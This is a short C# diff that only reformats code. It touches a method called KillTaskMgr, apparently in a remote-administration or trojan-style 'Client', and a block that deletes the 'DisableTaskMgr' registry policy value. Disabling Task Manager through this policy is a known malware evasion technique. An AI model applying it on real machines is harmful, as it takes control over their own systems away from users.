@@ -27,6 +27,7 @@ namespace Client
                 KillTaskMgr();
             }
         }
+
         public void KillTaskMgr()
         {
             RegistryKey regkey;
@@ -50,11 +51,9 @@ namespace Client
             try
             {
                 string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
-                using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(subKey, true)){
 
-                    if (rk != null)
-                        rk.DeleteValue("DisableTaskMgr", false);
-
+                using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(subKey, true)) {
+                    if (rk != null) rk.DeleteValue("DisableTaskMgr", false);
                 }
             }
             catch (Exception ex)
